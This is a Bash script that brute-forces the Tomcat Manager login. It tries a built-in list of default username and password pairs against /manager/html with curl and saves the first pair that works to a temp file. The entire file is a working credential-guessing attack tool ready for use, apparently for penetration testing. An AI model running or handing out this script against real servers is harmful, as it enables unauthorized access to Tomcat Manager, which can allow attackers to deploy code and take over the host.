#!/bin/bash
# Tomcat Manager 弱口令爆破
# Usage: tomcat_brute_creds.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:8080}"

BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')
rm -f /tmp/tc_cred.txt

echo "[*] Brute force @ $BASE"
echo "[*] Container source IP:"
hostname -I 2>/dev/null || ip -4 addr show | grep inet | head -3
echo "[*] Connectivity test:"
curl -s -o /dev/null -w "code=%{http_code} size=%{size_download}" "$BASE/" --max-time 5
echo ""
echo "[*] Manager access test (no auth):"
curl -s -o /dev/null -w "code=%{http_code}" "$BASE/manager/html" --max-time 5
echo ""

for cred in tomcat:tomcat admin:admin tomcat:s3cret \
            admin:123456 manager:manager root:root \
            admin:admin123 tomcat:changethis admin:tomcat \
            tomcat:admin admin:password role1:tomcat both:tomcat; do
  u=$(echo "$cred" | cut -d: -f1)
  p=$(echo "$cred" | cut -d: -f2)

  # 获取完整响应（body + 状态码）
  response=$(curl -s -L -u "$u:$p" -w "\n%{http_code}" "$BASE/manager/html" --max-time 8 2>/dev/null)
  body=$(echo "$response" | sed '$d')
  code=$(echo "$response" | tail -n1)

  # 状态码必须是 200，且 body 包含真正的 Manager 特征（放宽匹配）
  if [ "$code" = "200" ] && echo "$body" | grep -qi "Tomcat Web Application Manager\|List Applications\|Undeploy\|Listed applications"; then
    echo "$u:$p" > /tmp/tc_cred.txt
    echo "CRED_FOUND:$u:$p (html API)"
    echo "$body" | head -10
    exit 0
  elif [ "$code" = "401" ]; then
    echo "[.] $u:$p → 401 Unauthorized"
  elif [ "$code" = "403" ]; then
    echo "[.] $u:$p → 403 Forbidden (IP may be blocked)"
  else
    echo "[.] $u:$p → HTTP $code (not manager)"
  fi
done
echo "ALL_CREDS_FAILED"
echo "[!] All credentials rejected. Possible causes:"
echo "    - Tomcat RemoteAddrValve blocking container IP"
echo "    - Non-default credentials"
